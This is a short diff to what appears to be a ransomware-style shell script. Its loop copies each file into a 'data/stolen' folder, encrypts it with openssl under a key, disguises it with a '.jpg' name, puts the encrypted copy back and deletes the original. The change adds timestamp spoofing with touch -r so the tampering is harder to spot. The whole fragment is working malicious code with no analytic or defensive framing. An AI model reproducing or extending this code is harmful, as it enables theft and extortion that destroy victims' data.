@@ -65,7 +65,8 @@ do
 		echo "transferring and encrypting $f ($currentfile/$filecount)..."
 		gvfs-copy "$f" "$LOCALPATH/data/stolen/$TRANSDIR"
 		openssl aes-256-cbc -a -salt -in "$LOCALPATH/data/stolen/$TRANSDIR/$f" -out "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" -k $enc_key
-		#dont forget to delete orginal file
+		touch -r "$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" #give same timestamps to new encrypted file as old file
+		touch -r "$f" "$LOCALPATH/data/stolen/$TRANSDIR/$f" #same timestamp to copied file
 		gvfs-copy "$LOCALPATH/data/stolen/$TRANSDIR/$f.enc.jpg" .		
 		rm $f
 		currentfile=$((currentfile+1))
